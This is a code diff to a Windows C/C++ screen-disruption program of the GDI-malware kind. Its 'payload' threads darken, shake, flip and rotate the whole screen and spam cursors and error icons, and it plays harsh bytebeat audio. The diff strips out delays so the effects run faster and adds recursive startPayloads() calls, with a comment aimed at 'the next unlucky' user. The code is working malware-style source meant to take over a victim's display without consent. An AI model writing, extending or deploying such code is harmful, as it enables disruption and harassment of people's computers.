@@ -51,6 +51,24 @@ void WINAPI Bytebeat2() {
 	waveOutClose(wave);
 }
 
+void WINAPI BytebeatPato1() {
+	WAVEFORMATEX wavef = { WAVE_FORMAT_PCM, 1, 8000, 0, WAVE_FORMAT_PCM, 8, 0 };
+
+	waveOutOpen(&wave, 0, &wavef, 0, 0, 0);
+	char buffer[8000 * 60];
+
+	for (DWORD t = 0; t < sizeof(buffer); t++) {
+		buffer[t] = (64*(t>>3|t>>4|t>>9)+(t>>11&t<<2)^2*(t>>16|t|t>>7)+32*(t>>t&32));
+	}
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+
+	waveOutPrepareHeader(wave, &header, sizeof(WAVEHDR));
+	waveOutWrite(wave, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(wave, &header, sizeof(WAVEHDR));
+	waveOutClose(wave);
+}
+
 void WINAPI Bytebeat3() {
 	WAVEFORMATEX wavef = { WAVE_FORMAT_PCM, 1, 8000, 0, WAVE_FORMAT_PCM, 8, 0 };
 
@@ -114,7 +132,7 @@ DWORD WINAPI Dark(LPVOID lpstart) {
 	while (true) {
 		for (int ys = 0; ys < y; ys += 6) {
 			StretchBlt(hdc, 0, 0, x, ys, hdc, 0, 0, 1, 1, SRCAND);
-			Sleep(1);
+			//Sleep(1);
 		}
 	}
 }
@@ -139,11 +157,11 @@ DWORD WINAPI Cursors(LPVOID lpstart) {
 				GetCursorInfo(&cur);
 
 				DrawIcon(hdc, xs, ys, cur.hCursor);
-				xs += 2;
+				xs += sin(xs) * 2;
 				if (xs >= x) {
 					ys = y;
 				}
-				Sleep(1);
+				//Sleep(1);
 			}
 		}
 		else if (sel == 2) {
@@ -213,28 +231,28 @@ DWORD WINAPI RGBCircle(LPVOID lpstart) {
 
 	while (true) {
 		if (color == 1) {
-			circle = CreateSolidBrush(RGB(255, 165, 0));
+			circle = CreateSolidBrush(RGB(random() % 255, random() % 165, 0));
 		}
 		else if (color == 2) {
-			circle = CreateSolidBrush(RGB(255, 255, 0));
+			circle = CreateSolidBrush(RGB(random() % 255, random() % 255, 0));
 		}
 		else if (color == 3) {
-			circle = CreateSolidBrush(RGB(0, 255, 0));
+			circle = CreateSolidBrush(RGB(0, random() % 255, 0));
 		}
 		else if (color == 4) {
-			circle = CreateSolidBrush(RGB(0, 255, 255));
+			circle = CreateSolidBrush(RGB(0, random() % 255, random() % 255));
 		}
 		else if (color == 5) {
-			circle = CreateSolidBrush(RGB(0, 0, 255));
+			circle = CreateSolidBrush(RGB(0, 0, random() % 255));
 		}
 		else if (color == 6) {
-			circle = CreateSolidBrush(RGB(148, 0, 211));
+			circle = CreateSolidBrush(RGB(random() % 148, 0, random() % 211));
 		}
 		else if (color == 7) {
-			circle = CreateSolidBrush(RGB(255, 0, 255));
+			circle = CreateSolidBrush(RGB(random() % 255, 0, random() % 255));
 		}
 		else if (color == 8) {
-			circle = CreateSolidBrush(RGB(255, 0, 0));
+			circle = CreateSolidBrush(RGB(random() % 255, 0, 0));
 			color = 0;
 		}
 
@@ -258,33 +276,15 @@ DWORD WINAPI RGBCircle(LPVOID lpstart) {
 			ys = random() % y;
 		}
 
-		int sel = random() % 4 + 1;
+		//int sel = random() % 4 + 1;
 
-		for (int runtime = 0; runtime < 10; runtime++) {
-			if (sel == 1) {
-				Ellipse(hdc, xs - 60, ys - 60, xs + 60, ys + 60);
-				xs += 20;
-				ys += 20;
-				Sleep(130);
-			}
-			else if (sel == 2) {
-				Ellipse(hdc, xs - 60, ys - 60, xs + 60, ys + 60);
-				xs += 20;
-				ys -= 20;
-				Sleep(130);
-			}
-			else if (sel == 3) {
-				Ellipse(hdc, xs - 60, ys - 60, xs + 60, ys + 60);
-				xs -= 20;
-				ys += 20;
-				Sleep(130);
-			}
-			else if (sel == 4) {
-				Ellipse(hdc, xs - 60, ys - 60, xs + 60, ys + 60);
-				xs -= 20;
-				ys -= 20;
-				Sleep(130);
-			}
+		for (int runtime = 0; runtime < 100; runtime++) {
+			//if (sel == 1 || sel == 2 || sel == 3 || sel == 4) {
+				Ellipse(hdc, xs + random() * xs, ys + random() * 6, xs + random() * 6, ys + random() * 6);
+				xs += 10 * sin(xs); // omg math :0
+				ys += 10 * cos(ys);
+				//Sleep(130);
+			//}
 		}
 		color++;
 	}
@@ -314,7 +314,7 @@ DWORD WINAPI IconWave(LPVOID lpstart) {
 				DrawIcon(hdc, xs, ys + wave * cos(i), LoadIconW(0, IDI_ERROR));
 				i += 0.05;
 				wave += i + 0.32;
-				//Sleep(10); // too small value ngl
+				Sleep(1); // too small value ngl
 			}
 		}
 		else if (sel == 2) {
@@ -325,7 +325,7 @@ DWORD WINAPI IconWave(LPVOID lpstart) {
 				DrawIcon(hdc, xs, ys + wave * cos(i), LoadIconW(0, IDI_WARNING));
 				i += 0.05;
 				wave += i + 0.32;
-				//Sleep(10);
+				Sleep(1);
 			}
 		}
 		else if (sel == 3) {
@@ -336,7 +336,7 @@ DWORD WINAPI IconWave(LPVOID lpstart) {
 				DrawIcon(hdc, xs + wave * cos(i), ys, LoadIconW(0, IDI_INFORMATION));
 				i += 0.05;
 				wave += i + 0.32;
-				//Sleep(10);
+				Sleep(1);
 			}
 		}
 		else if (sel == 4) {
@@ -347,7 +347,7 @@ DWORD WINAPI IconWave(LPVOID lpstart) {
 				DrawIcon(hdc, xs + wave * cos(i), ys, LoadIconW(0, IDI_QUESTION));
 				i += 0.05;
 				wave += i + 0.32;
-				//Sleep(10);
+				Sleep(1);
 			}
 		}
 	}
@@ -383,14 +383,14 @@ DWORD WINAPI Shake(LPVOID lpstart) {
 
 		BitBlt(hdc, shit, shit, x, y, hdc, 0, 0, SRCCOPY);
 		Sleep(1000 / shit); // the bigger i is, the faster it will be
-		shit += 2.5;
+		shit += 1 * (shit / 5);
 
 		// NEGATIVE (eu descrobri que em quase todas as lilnguagems se tu por)
 		// "-" antes de uma variavel ela vira negativa (ex i -> -i)
 
 		BitBlt(hdc, -shit, -shit, x, y, hdc, 0, 0, SRCCOPY);
 		Sleep(1000 / shit); // the bigger i is, the faster it will be
-		shit += 2.5;
+		shit += 1 * (shit / 5);
 	}
 }
 
@@ -402,7 +402,7 @@ DWORD WINAPI Dark2(LPVOID lpstart) {
 
 	while (true) {
 		BitBlt(hdc, random() % 2, random() % 2, x, y, hdc, random() % 2, random() % 2, SRCAND);
-		Sleep(130);
+		//Sleep(130);
 	}
 }
 
@@ -456,7 +456,7 @@ DWORD WINAPI Trails(LPVOID lpstart) {
 		cur.cbSize = sizeof(cur);
 		GetCursorInfo(&cur);
 
-		DrawIcon(hdc, curpos.x, curpos.y, cur.hCursor);
+		DrawIcon(hdc, curpos.x + random(), curpos.y + random(), cur.hCursor);
 		Sleep(10);
 	}
 }
@@ -506,7 +506,7 @@ DWORD WINAPI Rotate(LPVOID lpstart) {
 			rotate[2].y = rekt.bottom + i;
 
 			PlgBlt(hdc, rotate, hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
-			Sleep(40);
+			Sleep(10);
 		}
 	}
 }
@@ -558,15 +558,16 @@ DWORD WINAPI Colors(LPVOID lpstart) {
 
 	while (true) {
 		int color = (random() % 2) ? 0x666666 : 0x999999;
+//									   funni	  funni
 
 		BitBlt(hdc, 1, 1, x, y, hdc, 0, 0, color);
-		Sleep(40);
+		Sleep(4);
 		BitBlt(hdc, -1, 1, x, y, hdc, 0, 0, color);
-		Sleep(40);
+		Sleep(4);
 		BitBlt(hdc, 1, -1, x, y, hdc, 0, 0, color);
-		Sleep(40);
+		Sleep(4);
 		BitBlt(hdc, -1, -1, x, y, hdc, 0, 0, color);
-		Sleep(40);
+		Sleep(4);
 	}
 }
 
@@ -578,9 +579,9 @@ DWORD WINAPI Flip(LPVOID lpstart) {
 
 	while (true) {
 		StretchBlt(hdc, 0, 0, x, y, hdc, x, 0, -x, y, SRCCOPY);
-		Sleep(100);
+		Sleep(10);
 		StretchBlt(hdc, 0, 0, x, y, hdc, 0, y, x, -y, SRCCOPY);
-		Sleep(100);
+		Sleep(10);
 	}
 }
 
@@ -728,7 +729,7 @@ void startPayloads() {
 	thread = CreateThread(0, 0, RGBCircle, 0, 0, &ID);
 	thread = CreateThread(0, 0, IconWave, 0, 0, &ID);
 	Reset();
-	Bytebeat2();
+	BytebeatPato1(); // UwU
 	TerminateThread(dark, 0);
 	CloseHandle(dark);
 
@@ -775,4 +776,7 @@ void startPayloads() {
 	CloseHandle(thread);
 
 	Sleep(random() % 4000 + 3000);
+
+	startPayloads(); // double
+	startPayloads(); // and give it to the next unlucky
 }
